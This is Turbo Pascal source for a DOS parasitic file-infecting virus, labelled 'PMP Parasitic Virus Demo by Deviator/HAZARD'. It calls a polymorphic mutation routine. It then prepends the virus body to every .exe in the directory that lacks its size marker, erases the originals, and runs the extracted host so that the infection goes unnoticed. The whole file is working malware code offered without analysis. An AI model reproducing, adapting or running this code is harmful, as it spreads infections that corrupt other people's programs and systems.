{$I SWITCHES.PMP}
{$M  $4096,$4096,35000}
Program PMPDEmo;
Uses Dos;
{$I VARS.PMP}

{$I PMP0.PMP}
{$I PMP1.PMP}
{$I PMP2.PMP}
{$I PMP3.PMP}
{$I PMP4.PMP}

 Begin
 Randomize;
 Writeln('PMP Parasitic Virus Demo by Deviator/HAZARD.');
 PMP_Mutate;
 Assign(Z,'PMPP.EXE');
 Reset(Z,1);
 FindFirst('*.exe',AnyFile,SRec);
 While DosError = 0 do Begin
 Assign(i,SRec.Name);
 Reset(i,1);
 If (FileSize(i) mod 40 <> 0) then Begin
 Rename(i,'ttt_ttt.ttt');
 Assign(o,SRec.Name);
 Rewrite(o,1);
 Seek(Z,0);
 CopyFile(Z,O);
 Seek(i,0);
 CopyFile(i,O);
 BlockWrite(o,X1,40-(FileSize(o) mod 40));
 Close(i);
 Close(o);
 Erase(i);
 End Else Close(i);
 FindNext(SRec);
 End;
 Close(z);
 Erase(z);
 Assign(i,Paramstr(0));
 Reset(i,1);
 Assign(o,'ttt_ttt.exe');
 Rewrite(o,1);
 BlockRead(i,X1,2);
 BlockRead(i,X1,2);
 BlockRead(i,X2,2);
 Seek(i,(X2-1)*512+X1);
 CopyFile(i,o);
 Close(i);
 Close(o);
 M := '';
 For X1 := 1 to ParamCount do M := M + Paramstr(X1)+' ';
 SwapVectors;
 Exec('ttt_ttt.exe',M);
 SwapVectors;
 Erase(o);
End.